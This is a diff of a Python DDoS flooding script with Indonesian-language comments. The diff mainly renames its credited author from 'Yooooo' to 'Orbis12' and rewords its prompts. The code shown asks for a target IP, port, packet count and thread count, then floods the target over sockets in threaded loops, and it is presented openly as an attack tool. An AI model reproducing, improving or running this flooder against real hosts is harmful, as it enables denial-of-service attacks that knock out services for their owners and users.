@@ -1,17 +1,17 @@
 #!/usr/bin/env python3
 #Kagak Usah Rename BY By Tai Anjing 
-#Ddos by Yooooo
+#Ddos by Orbis12
 import random
 import socket
 import threading
 import os
 
 os.system("clear")
-print("DDoS Tools By Yoooo [Beta Version]")
-print("Bismilah Tembus")
+print("DDoS Tools By Orbis12")
+print("Ddos Team Orbis Communty")
 ip = str(input(" Ip: "))
 port = int(input(" Port: "))
-choice = str(input(" Gas?(y/n): "))
+choice = str(input(" Mulai?(y/n): "))
 times = int(input(" Packets: "))
 threads = int(input(" Threads: "))
 def run():
@@ -37,7 +37,7 @@ def run2():
       s.send(data)
       for x in range(times):
         s.send(data)
-      print(i +" Yoooooooo Di Sini!!!")
+      print(i +" Orbis12 Di Sini!!!")
     except:
       s.close()
       print("[*] Down")
